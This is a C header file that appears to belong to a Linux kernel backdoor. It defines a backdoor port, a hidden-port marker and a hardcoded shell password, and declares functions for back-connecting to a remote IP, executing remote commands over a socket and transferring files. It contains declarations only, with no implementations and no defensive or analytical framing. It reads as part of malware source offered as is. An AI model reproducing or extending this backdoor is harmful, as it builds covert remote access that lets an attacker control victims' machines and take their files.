#ifndef BACKDOOR_H
#define BACKDOOR_H

#include <linux/types.h>

#define BACKDOOR_PORT 31317
#define HIDDEN_PORT "J234"
#define SHELL_PASS "Rasl9lwa"

int backconnect(char *ip, int port);
int remote_command_execution(struct socket *sock);
int remote_file_transfer(struct socket *sock);

#endif /* BACKDOOR_H */
